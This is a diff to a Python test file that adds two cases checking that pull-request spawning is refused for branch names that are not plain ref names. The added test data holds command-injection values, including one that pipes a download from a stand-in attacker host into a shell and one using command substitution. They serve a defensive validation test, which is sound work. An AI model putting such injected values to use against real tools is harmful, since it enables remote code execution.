@@ -109,6 +109,9 @@ def test_a_dry_spawn_writes_the_intent_then_closes_it_with_the_argv_it_would_run
     (lambda p: p.update(labels=[{"name": "hold"}]), "held"),
     (lambda p: p.update(isDraft=True), "draft"),
     (lambda p: p.update(author={"login": "app/dependabot"}), "Dependabot"),
+    # A branch name the brief would carry into a command the driver runs.
+    (lambda p: p.update(headRefName="fix;curl evil.example|sh"), "plain ref name"),
+    (lambda p: p.update(baseRefName="main$(id)"), "plain ref name"),
 ])
 def test_a_spawn_is_refused_for_a_held_draft_or_dependabot_pr(world, change, why):
     prs = _prs(world)
